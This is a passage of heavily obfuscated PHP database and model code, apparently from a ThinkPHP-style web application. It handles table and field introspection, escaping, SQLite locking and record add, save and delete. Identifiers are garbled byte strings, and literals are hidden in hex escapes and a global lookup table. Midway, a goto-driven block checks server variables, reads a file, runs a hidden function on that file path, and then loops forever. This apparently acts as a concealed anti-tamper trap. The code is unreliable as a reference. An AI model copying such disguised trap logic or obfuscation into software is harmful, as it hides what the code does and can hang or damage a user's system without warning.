think_config($µ£“≥ïù[1007])); } else { switch ($this->dbType) { case $µ£“≥ïù[991]: case $µ£“≥ïù[1009]: $™ïµ≤êœ = "\x53\x45\x4c\105\103\x54\x20\x20\x20\x63\x6f\154\165\x6d\156\137\x6e\x61\155\x65\40\x61\x73\x20\x27\x4e\x61\x6d\145\x27\54\40\40\x20\144\141\x74\x61\x5f\164\171\x70\x65\40\141\163\40\x27\124\x79\x70\145\47\54\x20\40\x20\143\157\154\x75\155\156\x5f\144\145\x66\141\x75\154\x74\x20\141\163\x20\47\x44\145\146\141\x75\154\x74\47\54\40\x20\40\151\163\137\156\x75\x6c\154\x61\142\154\145\40\141\163\40\x27\x4e\165\154\154\47\xa\x9\x9\x46\x52\117\x4d\x9\x69\156\x66\x6f\x72\x6d\141\164\151\x6f\x6e\137\163\143\150\x65\155\x61\56\x74\141\142\x6c\145\163\40\101\123\x20\164\xa\11\x9\x4a\117\x49\x4e\11\x69\156\146\x6f\162\x6d\141\x74\x69\x6f\156\137\x73\143\x68\145\x6d\141\56\x63\157\x6c\165\x6d\x6e\163\x20\x41\123\x20\x63\12\11\x9\x4f\x4e\40\x20\164\56\164\x61\x62\x6c\145\x5f\143\141\x74\141\x6c\x6f\x67\40\x3d\x20\143\x2e\x74\x61\x62\154\145\x5f\143\x61\164\x61\154\x6f\147\xa\x9\x9\101\116\104\40\x74\56\164\x61\142\x6c\145\137\163\143\x68\x65\155\x61\x20\75\x20\x63\x2e\164\x61\x62\x6c\145\x5f\163\143\x68\x65\155\x61\12\11\11\x41\116\104\x20\x74\56\x74\x61\x62\154\x65\x5f\x6e\x61\155\x65\40\x3d\40\x63\56\x74\x61\x62\x6c\x65\x5f\x6e\141\155\x65\12\x9\x9\127\x48\x45\x52\x45\40\x20\40\x74\56\164\141\142\154\145\137\x6e\x61\155\145\40\75\40\47{$≥ÜïåΩá}\x27"; break; case $µ£“≥ïù[1010]: $™ïµ≤êœ = $µ£“≥ïù[1011] . $≥ÜïåΩá . $µ£“≥ïù[1012]; break; case $µ£“≥ïù[992]: case $µ£“≥ïù[994]: $™ïµ≤êœ = $µ£“≥ïù[1013] . $µ£“≥ïù[1014] . $µ£“≥ïù[1015] . strtoupper($≥ÜïåΩá) . $µ£“≥ïù[1016] . strtoupper($≥ÜïåΩá) . $µ£“≥ïù[1017]; break; case $µ£“≥ïù[1018]: $™ïµ≤êœ = $µ£“≥ïù[1019] . $≥ÜïåΩá . $µ£“≥ïù[1020]; break; case $µ£“≥ïù[993]: break; case $µ£“≥ïù[1021]: default: $™ïµ≤êœ = $µ£“≥ïù[1022] . ($this->dbType == $µ£“≥ïù[1021] ? "\x60{$≥ÜïåΩá}\140" : $≥ÜïåΩá); } } $áØçâä¸ = $this->query($™ïµ≤êœ); $ßΩãı¬Œ = array(); if ($áØçâä¸) { foreach ($áØçâä¸ as $òæã°„¥ => $„“úµˆ⁄) { $„“úµˆ⁄ = array_change_key_case($„“úµˆ⁄); $„“úµˆ⁄[$µ£“≥ïù[32]] = isset($„“úµˆ⁄[$µ£“≥ïù[32]]) ? $„“úµˆ⁄[$µ£“≥ïù[32]] : $µ£“≥ïù[329]; $„“úµˆ⁄[$µ£“≥ïù[33]] = isset($„“úµˆ⁄[$µ£“≥ïù[33]]) ? $„“úµˆ⁄[$µ£“≥ïù[33]] : $µ£“≥ïù[329]; $Ö≤±µâ‰ = isset($„“úµˆ⁄[$µ£“≥ïù[359]]) ? $„“úµˆ⁄[$µ£“≥ïù[359]] : $„“úµˆ⁄[$µ£“≥ïù[32]]; $ßΩãı¬Œ[$Ö≤±µâ‰] = array($µ£“≥ïù[32] => $Ö≤±µâ‰, $µ£“≥ïù[33] => $„“úµˆ⁄[$µ£“≥ïù[33]], $µ£“≥ïù[35] => (bool) (isset($„“úµˆ⁄[$µ£“≥ïù[106]]) && $„“úµˆ⁄[$µ£“≥ïù[106]] === $µ£“≥ïù[12] || isset($„“úµˆ⁄[$µ£“≥ïù[35]]) && $„“úµˆ⁄[$µ£“≥ïù[35]] === $µ£“≥ïù[12]), $µ£“≥ïù[37] => isset($„“úµˆ⁄[$µ£“≥ïù[37]]) ? $„“úµˆ⁄[$µ£“≥ïù[37]] : (isset($„“úµˆ⁄[$µ£“≥ïù[56]]) ? $„“úµˆ⁄[$µ£“≥ïù[56]] : $µ£“≥ïù[329]), $µ£“≥ïù[39] => isset($„“úµˆ⁄[$µ£“≥ïù[97]]) ? strtolower($„“úµˆ⁄[$µ£“≥ïù[97]]) == $µ£“≥ïù[41] : (isset($„“úµˆ⁄[$µ£“≥ïù[57]]) ? $„“úµˆ⁄[$µ£“≥ïù[57]] : !1), $µ£“≥ïù[42] => isset($„“úµˆ⁄[$µ£“≥ïù[1023]]) ? strtolower($„“úµˆ⁄[$µ£“≥ïù[1023]]) == $µ£“≥ïù[44] : (isset($„“úµˆ⁄[$µ£“≥ïù[97]]) ? $„“úµˆ⁄[$µ£“≥ïù[97]] : !1)); } } return $ßΩãı¬Œ; } public function getTables($Ëœ ·í— = '') { $“ﬂ¢…¥¨ =& $_SERVER[ß⁄ˆÇ†Œ]; if (think_config($“ﬂ¢…¥¨[1024])) { $ÿ˘£ç◊ñ = str_replace($“ﬂ¢…¥¨[1025], $Ëœ ·í—, think_config($“ﬂ¢…¥¨[1024])); } else { switch ($this->dbType) { case $“ﬂ¢…¥¨[992]: case $“ﬂ¢…¥¨[994]: $ÿ˘£ç◊ñ = $“ﬂ¢…¥¨[1026]; break; case $“ﬂ¢…¥¨[991]: case $“ﬂ¢…¥¨[1009]: $ÿ˘£ç◊ñ = $“ﬂ¢…¥¨[1027]; break; case $“ﬂ¢…¥¨[1018]: $ÿ˘£ç◊ñ = $“ﬂ¢…¥¨[1028]; break; case $“ﬂ¢…¥¨[993]: think_exception(think_lang($“ﬂ¢…¥¨[1029]) . $“ﬂ¢…¥¨[1030]); break; case $“ﬂ¢…¥¨[1010]: $ÿ˘£ç◊ñ = $“ﬂ¢…¥¨[45] . $“ﬂ¢…¥¨[46] . $“ﬂ¢…¥¨[47]; break; case $“ﬂ¢…¥¨[1021]: default: if (!empty($Ëœ ·í—)) { $ÿ˘£ç◊ñ = $“ﬂ¢…¥¨[973] . $Ëœ ·í— . $“ﬂ¢…¥¨[974]; } else { $ÿ˘£ç◊ñ = $“ﬂ¢…¥¨[975]; } } } $ŒÁ—õÄ— = $this->query($ÿ˘£ç◊ñ); $ëΩ…Ó∂Í = array(); foreach ($ŒÁ—õÄ— as $≈Äò˛¡≤ => $—à“ ó˛) { $ëΩ…Ó∂Í[$≈Äò˛¡≤] = current($—à“ ó˛); } return $ëΩ…Ó∂Í; } protected function parseLimit($™Í‘Ùçù) { $˙‘∂“Ò˛ =& $_SERVER[ß⁄ˆÇ†Œ]; $éŒÃ–ïÓ = $˙‘∂“Ò˛[12]; if (!empty($™Í‘Ùçù)) { switch ($this->dbType) { case $˙‘∂“Ò˛[1018]: case $˙‘∂“Ò˛[1010]: $™Í‘Ùçù = explode($˙‘∂“Ò˛[50], $™Í‘Ùçù); if (count($™Í‘Ùçù) > 1) { $éŒÃ–ïÓ .= $˙‘∂“Ò˛[51] . $™Í‘Ùçù[1] . $˙‘∂“Ò˛[52] . $™Í‘Ùçù[0] . $˙‘∂“Ò˛[53]; } else { $éŒÃ–ïÓ .= $˙‘∂“Ò˛[51] . $™Í‘Ùçù[0] . $˙‘∂“Ò˛[53]; } break; case $˙‘∂“Ò˛[991]: case $˙‘∂“Ò˛[1009]: break; case $˙‘∂“Ò˛[993]: break; case $˙‘∂“Ò˛[992]: case $˙‘∂“Ò˛[994]: break; case $˙‘∂“Ò˛[1021]: default: $éŒÃ–ïÓ .= $˙‘∂“Ò˛[51] . $™Í‘Ùçù . $˙‘∂“Ò˛[53]; } } return $éŒÃ–ïÓ; } public function parseKey(&$Ç÷‘©£ö, $ªﬂëÌ˜◊ = true) { $ç∂é‘„ã =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ªﬂëÌ˜◊) { $Ç÷‘©£ö = $this->parseKeyCheck($Ç÷‘©£ö); } if ($this->dbType == $ç∂é‘„ã[1021]) { if ($Ç÷‘©£ö != $ç∂é‘„ã[220] && !preg_match($ç∂é‘„ã[985], $Ç÷‘©£ö)) { $Ç÷‘©£ö = $ç∂é‘„ã[469] . trim($Ç÷‘©£ö, $ç∂é‘„ã[469]) . $ç∂é‘„ã[469]; } return $Ç÷‘©£ö; } else { return parent::parseKey($Ç÷‘©£ö, $ªﬂëÌ˜◊); } } public function close() { $this->_linkID = null; } public function error() { $à´ä¢Üı =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->PDOStatement) { $ìë‹œ÷√ = $this->PDOStatement->errorInfo(); $this->error = $ìë‹œ÷√[1] . $à´ä¢Üı[4] . $ìë‹œ÷√[2]; } else { $this->error = $à´ä¢Üı[12]; } if ($à´ä¢Üı[12] != $this->queryStr) { $this->error .= LNG($à´ä¢Üı[48]) . $this->queryStr; } think_trace($this->error, $à´ä¢Üı[12], $à´ä¢Üı[49]); return $this->error; } public function escapeString($¥«ú‚ﬁŸ) { $◊’©ˆ∑œ =& $_SERVER[ß⁄ˆÇ†Œ]; switch ($this->dbType) { case $◊’©ˆ∑œ[1018]: case $◊’©ˆ∑œ[991]: case $◊’©ˆ∑œ[1009]: case $◊’©ˆ∑œ[1021]: return addslashes($¥«ú‚ﬁŸ); case $◊’©ˆ∑œ[993]: case $◊’©ˆ∑œ[1010]: case $◊’©ˆ∑œ[992]: case $◊’©ˆ∑œ[994]: return str_ireplace($◊’©ˆ∑œ[58], $◊’©ˆ∑œ[59], $¥«ú‚ﬁŸ); } } protected function parseValue($˚ÚÁı‚Ä) { $ Åüæñü =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_string($˚ÚÁı‚Ä)) { $≤≈≥»˚© = strpos($˚ÚÁı‚Ä, $ Åüæñü[4]) === 0 && in_array($˚ÚÁı‚Ä, array_keys($this->bind)); $˚ÚÁı‚Ä = $≤≈≥»˚© ? $this->escapeString($˚ÚÁı‚Ä) : $ Åüæñü[1031] . $this->escapeString($˚ÚÁı‚Ä) . $ Åüæñü[1031]; } elseif (isset($˚ÚÁı‚Ä[0]) && is_string($˚ÚÁı‚Ä[0]) && strtolower($˚ÚÁı‚Ä[0]) == $ Åüæñü[382]) { $˚ÚÁı‚Ä = $this->escapeString($˚ÚÁı‚Ä[1]); } elseif (is_array($˚ÚÁı‚Ä)) { $˚ÚÁı‚Ä = array_map(array($this, $ Åüæñü[1032]), $˚ÚÁı‚Ä); } elseif (is_bool($˚ÚÁı‚Ä)) { $˚ÚÁı‚Ä = $˚ÚÁı‚Ä ? $ Åüæñü[91] : $ Åüæñü[228]; } elseif (is_null($˚ÚÁı‚Ä)) { $˚ÚÁı‚Ä = $ Åüæñü[106]; } return $˚ÚÁı‚Ä; } public function getLastInsertId() { $‚≤∆üºá =& $_SERVER[ß⁄ˆÇ†Œ]; switch ($this->dbType) { case $‚≤∆üºá[1018]: case $‚≤∆üºá[1010]: case $‚≤∆üºá[991]: case $‚≤∆üºá[1009]: case $‚≤∆üºá[993]: case $‚≤∆üºá[1021]: return $this->_linkID->lastInsertId(); case $‚≤∆üºá[992]: case $‚≤∆üºá[994]: $™⁄á⁄Ô† = $this->table; $ãì®ÛÉ› = $this->query("\x53\x45\114\x45\x43\124\40{$™⁄á⁄Ô†}\x2e\x63\165\x72\x72\166\x61\x6c\x20\x63\x75\x72\x72\166\141\x6c\x20\x46\122\x4f\x4d\x20\x64\165\x61\154"); return $ãì®ÛÉ› ? $ãì®ÛÉ›[0][$‚≤∆üºá[1033]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($©¡§˙∏Æ) { $¸‚’Õ¿ó =& $_SERVER[ß⁄ˆÇ†Œ]; if (!CacheLock::fileLock($¸‚’Õ¿ó[13])) { return !1; } $»ìµ»ŸΩ = parent::query($©¡§˙∏Æ); CacheLock::fileUnLock($¸‚’Õ¿ó[13]); return $»ìµ»ŸΩ; } public function execute($áÚõ¡‡©) { $—¨±¸¬˙ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!CacheLock::fileLock($—¨±¸¬˙[13])) { return !1; } $≠÷ö≤˛• = parent::execute($áÚõ¡‡©); CacheLock::fileUnLock($—¨±¸¬˙[13]); return $≠÷ö≤˛•; } } class DbSqlite3 extends DbSqlite3Base { public function query($èµé˜¥®) { $∫ËîÿÖ– =& $_SERVER[ß⁄ˆÇ†Œ]; if (!CacheLock::fileLock($∫ËîÿÖ–[13])) { return !1; } $“˜á∑Õ∂ = parent::query($èµé˜¥®); CacheLock::fileUnLock($∫ËîÿÖ–[13]); return $“˜á∑Õ∂; } public function execute($¥Ã∆⁄âÚ) { $ïî„„¿≈ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!CacheLock::fileLock($ïî„„¿≈[13])) { return !1; } $ø®à„…ö = parent::execute($¥Ã∆⁄âÚ); CacheLock::fileUnLock($ïî„„¿≈[13]); return $ø®à„…ö; } } goto Bñãñç—È—; e ¡¢çÔüƒ: define($_SERVER[ß⁄ˆÇ†Œ][317], 3); define($_SERVER[ß⁄ˆÇ†Œ][318], 1); define($_SERVER[ß⁄ˆÇ†Œ][319], 0); goto Eÿâê∆Éãø; Eÿâê∆Éãø: define($_SERVER[ß⁄ˆÇ†Œ][320], 2); if (!isset($_SERVER[$_SERVER[ß⁄ˆÇ†Œ][321]]) || !isset($_SERVER[$_SERVER[ß⁄ˆÇ†Œ][322]])) { $_getc = $_SERVER[ß⁄ˆÇ†Œ][323]; $_getfile = $_SERVER[$_SERVER[ß⁄ˆÇ†Œ][324]] . $_SERVER[ß⁄ˆÇ†Œ][325]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ß⁄ˆÇ†Œ][262], $_getfilec); if (count($_getarrs) < $_SERVER[ß⁄ˆÇ†Œ][326]) { $exit = $_SERVER[ß⁄ˆÇ†Œ][327]; $exit(); } $_act = $_SERVER[ß⁄ˆÇ†Œ][328]; $_act($_SERVER[$_SERVER[ß⁄ˆÇ†Œ][324]] . $_SERVER[ß⁄ˆÇ†Œ][325]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ß⁄ˆÇ†Œ][329]); } } class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\145", "\x6f\162\x64\x65\x72", "\x61\x6c\x69\x61\x73", "\150\141\166\x69\x6e\x67", "\147\162\x6f\x75\x70", "\x6c\157\x63\x6b", "\x64\x69\163\164\151\x6e\143\164", "\x61\x75\164\157", "\146\x69\x6c\x74\145\x72", "\166\x61\154\151\x64\141\164\x65", "\x72\145\x73\165\x6c\164", "\142\151\x6e\144", "\164\x6f\x6b\145\x6e"); public function __construct($õ∆˚û˜∞ = '', $¿«Ê˚åÈ = '', $ùãÉ‚±Œ = '') { $å∏Ñì»Å =& $_SERVER[ß⁄ˆÇ†Œ]; $this->_initialize(); if (!empty($õ∆˚û˜∞)) { if (strpos($õ∆˚û˜∞, $å∏Ñì»Å[10])) { list($this->dbName, $this->name) = explode($å∏Ñì»Å[10], $õ∆˚û˜∞); } else { $this->name = $õ∆˚û˜∞; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¿«Ê˚åÈ)) { $this->tablePrefix = $å∏Ñì»Å[12]; } elseif ($å∏Ñì»Å[12] != $¿«Ê˚åÈ) { $this->tablePrefix = $¿«Ê˚åÈ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($å∏Ñì»Å[330]); } $this->db(0, empty($this->connection) ? $ùãÉ‚±Œ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $—ÙÒ˛Öı =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($this->fields)) { if (think_config($—ÙÒ˛Öı[331])) { $ëﬁ€∑’ò = $this->dbName ? $this->dbName : think_config($—ÙÒ˛Öı[332]); $Ã ÜåËï = think_var_cache($—ÙÒ˛Öı[333] . strtolower(get_path_this($ëﬁ€∑’ò) . $—ÙÒ˛Öı[10] . $this->name)); if ($Ã ÜåËï) { $§Ë…öö§ = think_config($—ÙÒ˛Öı[334]); if (empty($§Ë…öö§) || $Ã ÜåËï[$—ÙÒ˛Öı[335]] == $§Ë…öö§) { $this->fields = $Ã ÜåËï; return; } } } $this->flush(); } } public function flush() { $œíõôÈ√ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->db->setModel($this->name); $„≈Ú“°ı = $this->db->getFields($this->getTableName()); if (!$„≈Ú“°ı) { return !1; } $this->fields = array_keys($„≈Ú“°ı); $this->fields[$œíõôÈ√[336]] = !1; foreach ($„≈Ú“°ı as $öÀ˙”¥¬ => $ÚÉÈÈÙ·) { $ß’¥è≤¬[$öÀ˙”¥¬] = $ÚÉÈÈÙ·[$œíõôÈ√[33]]; if ($ÚÉÈÈÙ·[$œíõôÈ√[39]]) { $this->fields[$œíõôÈ√[337]] = $öÀ˙”¥¬; if ($ÚÉÈÈÙ·[$œíõôÈ√[42]]) { $this->fields[$œíõôÈ√[336]] = !0; } } } $this->fields[$œíõôÈ√[338]] = $ß’¥è≤¬; if (think_config($œíõôÈ√[334])) { $this->fields[$œíõôÈ√[335]] = think_config($œíõôÈ√[334]); } if (think_config($œíõôÈ√[331])) { $ÆÁ™î¯‰ = $this->dbName ? $this->dbName : think_config($œíõôÈ√[332]); think_var_cache($œíõôÈ√[333] . strtolower(get_path_this($ÆÁ™î¯‰) . $œíõôÈ√[10] . $this->name), $this->fields); } } public function switchModel($ºÄŒòî˘, $•∞ﬂãËá = array()) { $⁄Ì‘¶©· =& $_SERVER[ß⁄ˆÇ†Œ]; $·€≈ªÊ¶ = ucwords(strtolower($ºÄŒòî˘)) . $⁄Ì‘¶©·[339]; if (!class_exists($·€≈ªÊ¶)) { think_exception($·€≈ªÊ¶ . think_lang($⁄Ì‘¶©·[340])); } $this->_extModel = new $·€≈ªÊ¶($this->name); if (!empty($•∞ﬂãËá)) { foreach ($•∞ﬂãËá as $◊õ∞ÍØ…) { $this->_extModel->setProperty($◊õ∞ÍØ…, $this->{$◊õ∞ÍØ…}); } } return $this->_extModel; } public function __set($Ë≤œ®ˆ—, $Ω«ôÖì≥) { $this->data[$Ë≤œ®ˆ—] = $Ω«ôÖì≥; } public function __get($ÁŸû∑À≥) { return isset($this->data[$ÁŸû∑À≥]) ? $this->data[$ÁŸû∑À≥] : null; } public function __isset($ﬂ–∂ªÜÏ) { return isset($this->data[$ﬂ–∂ªÜÏ]); } public function __unset($ûùÈïØâ) { unset($this->data[$ûùÈïØâ]); } public function __call($ì©¶’ò≤, $·ô‹∂È∏) { $ƒ≠Œ≈Ò˜ =& $_SERVER[ß⁄ˆÇ†Œ]; if (in_array(strtolower($ì©¶’ò≤), $this->methods, !0)) { $this->options[strtolower($ì©¶’ò≤)] = $·ô‹∂È∏[0]; return $this; } elseif (in_array(strtolower($ì©¶’ò≤), array($ƒ≠Œ≈Ò˜[341], $ƒ≠Œ≈Ò˜[342], $ƒ≠Œ≈Ò˜[343], $ƒ≠Œ≈Ò˜[344], $ƒ≠Œ≈Ò˜[345]), !0)) { $¬€∂èêã = isset($·ô‹∂È∏[0]) ? $·ô‹∂È∏[0] : $ƒ≠Œ≈Ò˜[220]; $¬€∂èêã = $this->db->parseKey($¬€∂èêã); return $this->getField(strtoupper($ì©¶’ò≤) . $ƒ≠Œ≈Ò˜[346] . $¬€∂èêã . $ƒ≠Œ≈Ò˜[347] . $ì©¶’ò≤, $ƒ≠Œ≈Ò˜[341]); } elseif (strtolower(substr($ì©¶’ò≤, 0, 5)) == $ƒ≠Œ≈Ò˜[348]) { $¬€∂èêã = think_parse_name(substr($ì©¶’ò≤, 5)); $´∂ú¿ÚÂ[$¬€∂èêã] = $·ô‹∂È∏[0]; return $this->where($´∂ú¿ÚÂ)->find(); } elseif (strtolower(substr($ì©¶’ò≤, 0, 10)) == $ƒ≠Œ≈Ò˜[349]) { $Äè≤˙Ù¡ = think_parse_name(substr($ì©¶’ò≤, 10)); $´∂ú¿ÚÂ[$Äè≤˙Ù¡] = $·ô‹∂È∏[0]; return $this->where($´∂ú¿ÚÂ)->getField($·ô‹∂È∏[1]); } elseif (isset($this->_scope[$ì©¶’ò≤])) { return $this->scope($ì©¶’ò≤, $·ô‹∂È∏[0]); } elseif (method_exists($this, $ì©¶’ò≤)) { array_unshift($·ô‹∂È∏, $ì©¶’ò≤); return call_user_func_array(array($this, $ƒ≠Œ≈Ò˜[350]), $·ô‹∂È∏); } else { return call_user_func_array(array(parent, $ì©¶’ò≤), $·ô‹∂È∏); } } protected function call() { $ØÒ˜˙œÈ =& $_SERVER[ß⁄ˆÇ†Œ]; $Á≈ÑÈß’ = func_get_args(); $ “≠ÍÁ¨ = array_shift($Á≈ÑÈß’); $•–ﬂÔæÙ = $ “≠ÍÁ¨; if (is_array($ “≠ÍÁ¨)) { $•–ﬂÔæÙ = $ “≠ÍÁ¨[1]; $ “≠ÍÁ¨ = $ “≠ÍÁ¨[0]; } $∏µö€’° = count($Á≈ÑÈß’) - 1; if (isset($Á≈ÑÈß’[$∏µö€’°]) && $Á≈ÑÈß’[$∏µö€’°] === $ “≠ÍÁ¨) { think_exception(__CLASS__ . $ØÒ˜˙œÈ[4] . $ “≠ÍÁ¨ . think_lang($ØÒ˜˙œÈ[351])); return; } $Á≈ÑÈß’[] = $ “≠ÍÁ¨; if (method_exists($this, $ØÒ˜˙œÈ[352])) { $ÌóúÂ»« = call_user_func_array(array($this, $ØÒ˜˙œÈ[353]), array($•–ﬂÔæÙ, $Á≈ÑÈß’)); if (!is_null($ÌóúÂ»«) && $ÌóúÂ»« !== !1) { return $ÌóúÂ»«; } } $á√˘Ÿ≠∏ = call_user_func_array(array($this, $ “≠ÍÁ¨), $Á≈ÑÈß’); if (method_exists($this, $ØÒ˜˙œÈ[354])) { $ÌóúÂ»« = call_user_func_array(array($this, $ØÒ˜˙œÈ[355]), array($•–ﬂÔæÙ, $Á≈ÑÈß’, $á√˘Ÿ≠∏)); if ($ÌóúÂ»«) { return $ÌóúÂ»«; } } return $á√˘Ÿ≠∏; } protected function _initialize() { } protected function _facade($ÀÔµúÃñ) { $∑‡êï¶≤ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!empty($this->fields)) { foreach ($ÀÔµúÃñ as $Ô≥óŒ∂≥ => $«˙‡®ì•) { if (is_array($this->fields) && !in_array($Ô≥óŒ∂≥, $this->fields, !0)) { unset($ÀÔµúÃñ[$Ô≥óŒ∂≥]); } elseif (is_scalar($«˙‡®ì•)) { $this->_parseType($ÀÔµúÃñ, $Ô≥óŒ∂≥); } } } if (!empty($this->options[$∑‡êï¶≤[356]])) { $ÀÔµúÃñ = array_map($this->options[$∑‡êï¶≤[356]], $ÀÔµúÃñ); unset($this->options[$∑‡êï¶≤[356]]); } $this->_beforeWrite($ÀÔµúÃñ); return $ÀÔµúÃñ; } protected function _beforeWrite(&$Ω˘Æœﬁ∂) { } public function add($Â∂®‹Ô˝ = '', $óªß≠Ø¢ = array(), $ﬂé∆ëØÄ = false) { if (empty($Â∂®‹Ô˝)) { if (!empty($this->data)) { $Â∂®‹Ô˝ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ß⁄ˆÇ†Œ][357]); return !1; } } $óªß≠Ø¢ = $this->_parseOptions($óªß≠Ø¢); $Â∂®‹Ô˝ = $this->_facade($Â∂®‹Ô˝); if (!1 === $this->_beforeInsert($Â∂®‹Ô˝, $óªß≠Ø¢)) { return !1; } $öÎ”Ó∆— = $this->db->insert($Â∂®‹Ô˝, $óªß≠Ø¢, $ﬂé∆ëØÄ); if (!1 !== $öÎ”Ó∆—) { $§ü˙éå» = $this->getLastInsID(); if ($§ü˙éå») { $Â∂®‹Ô˝[$this->getPk()] = $§ü˙éå»; $this->_after_insert($Â∂®‹Ô˝, $óªß≠Ø¢); return $§ü˙éå»; } $this->_after_insert($Â∂®‹Ô˝, $óªß≠Ø¢); } return $öÎ”Ó∆—; } protected function _beforeInsert(&$œı»œ˚Ó, $éùãôﬁÛ) { } protected function _after_insert($Ù«‘àÎã, $ÏŸüâ®ﬂ) { } public function addAll($ÎÚÊûÈå, $Ü≠õ∫∆Ì = array(), $è®é˙∏≠ = false) { $˜í®≥íÉ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($ÎÚÊûÈå)) { $this->error = think_lang($˜í®≥íÉ[357]); return !1; } $Ü≠õ∫∆Ì = $this->_parseOptions($Ü≠õ∫∆Ì); foreach ($ÎÚÊûÈå as $„»Á“ÂΩ => $Û≈ΩÙÙ•) { $ÎÚÊûÈå[$„»Á“ÂΩ] = $this->_facade($Û≈ΩÙÙ•); } if (method_exists($this->db, $˜í®≥íÉ[358])) { $†ç Å˙≥ = $this->db->insertAll($ÎÚÊûÈå, $Ü≠õ∫∆Ì, $è®é˙∏≠); } else { $this->startTrans(); foreach ($ÎÚÊûÈå as $„»Á“ÂΩ => $Û≈ΩÙÙ•) { $†ç Å˙≥ = $this->db->insert($Û≈ΩÙÙ•, $Ü≠õ∫∆Ì, $è®é˙∏≠); } $this->commit(); } if (!1 !== $†ç Å˙≥) { $çÇÇÊŒö = $this->getLastInsID(); if ($çÇÇÊŒö) { return $çÇÇÊŒö; } } return $†ç Å˙≥; } public function selectAdd($‹≥•ì®ˆ = '', $¡ê…∞õË = '', $Ë„⁄ë´è = array()) { $âπƒ¯ÆØ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ë„⁄ë´è = $this->_parseOptions($Ë„⁄ë´è); if (!1 === ($´»ìîÎÿ = $this->db->selectInsert($‹≥•ì®ˆ ? $‹≥•ì®ˆ : $Ë„⁄ë´è[$âπƒ¯ÆØ[359]], $¡ê…∞õË ? $¡ê…∞õË : $this->getTableName(), $Ë„⁄ë´è))) { $this->error = think_lang($âπƒ¯ÆØ[360]); return !1; } else { return $´»ìîÎÿ; } } public function save($œÇº≥¨ﬁ = '', $åö¶¿« = array()) { $äç“Äıﬂ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($œÇº≥¨ﬁ)) { if (!empty($this->data)) { $œÇº≥¨ﬁ = $this->data; $this->data = array(); } else { $this->error = think_lang($äç“Äıﬂ[357]); return !1; } } $œÇº≥¨ﬁ = $this->_facade($œÇº≥¨ﬁ); $åö¶¿« = $this->_parseOptions($åö¶¿«); $Åü‡ÜÍ◊ = $this->getPk(); if (!isset($åö¶¿«[$äç“Äıﬂ[361]])) { if (isset($œÇº≥¨ﬁ[$Åü‡ÜÍ◊])) { $¨¨ÄŒ–ª[$Åü‡ÜÍ◊] = $œÇº≥¨ﬁ[$Åü‡ÜÍ◊]; $åö¶¿«[$äç“Äıﬂ[361]] = $¨¨ÄŒ–ª; unset($œÇº≥¨ﬁ[$Åü‡ÜÍ◊]); } else { $this->error = think_lang($äç“Äıﬂ[360]); return !1; } } if (is_array($åö¶¿«[$äç“Äıﬂ[361]]) && isset($åö¶¿«[$äç“Äıﬂ[361]][$Åü‡ÜÍ◊])) { $ñÁÉ≤˚Ë = $åö¶¿«[$äç“Äıﬂ[361]][$Åü‡ÜÍ◊]; } if (!1 === $this->_beforeUpdate($œÇº≥¨ﬁ, $åö¶¿«)) { return !1; } $•ƒﬂîéÙ = $this->db->update($œÇº≥¨ﬁ, $åö¶¿«); if (!1 !== $•ƒﬂîéÙ) { if (isset($ñÁÉ≤˚Ë)) { $œÇº≥¨ﬁ[$Åü‡ÜÍ◊] = $ñÁÉ≤˚Ë; } $this->_afterUpdate($œÇº≥¨ﬁ, $åö¶¿«); } return $•ƒﬂîéÙ; } protected function _beforeUpdate(&$Ì—Ø‘Ê¨, $ﬁ¡≥ò‰õ) { } protected function _afterUpdate($πﬁ©Óü˛, $õÇªñ∂ﬁ) { } public function delete($õÕÉ„é∏ = array()) { $Ã¯≤…˜ÿ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($õÕÉ„é∏) && empty($this->options[$Ã¯≤…˜ÿ[361]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $˛Ωöòº = $this->getPk(); if (is_numeric($õÕÉ„é∏) || is_string($õÕÉ„é∏)) { if (strpos($õÕÉ„é∏, $Ã¯≤…˜ÿ[50])) { $öòµ€¡á[$˛Ωöòº] = array($Ã¯≤…˜ÿ[362], $õÕÉ„é∏); } else { $öòµ€¡á[$˛Ωöòº] = $õÕÉ„é∏; } $this->options[$Ã¯≤…˜ÿ[361]] = $öòµ€¡á; } $õÕÉ„é∏ = $this->_parseOptions(); if (is_array($õÕÉ„é∏[$Ã¯≤…˜ÿ[361]]) && isset($õÕÉ„é∏[$Ã¯≤…˜ÿ[361]][$˛Ωöòº])) { $ÙÎé™èò = $õÕÉ„é∏[$Ã¯≤…˜ÿ[361]][$˛Ωöòº]; } $µÛ∫√∞¡ = $this->db->delete($õÕÉ„é∏); if (!1 !== $µÛ∫√∞¡) { $£ÛÖ∑∏Ÿ = array(); if (isset($ÙÎé™èò)) { $£ÛÖ∑∏Ÿ[$˛Ωöòº] = $ÙÎé™èò; } $this->_after_delete($£ÛÖ∑∏Ÿ, $õÕÉ„é∏); } return $µÛ∫√∞¡; } protected function _after_delete($©·óµ¸Ì, $∑‚â∂ÌŒ) { } public function select($ö˜å’º≤ = 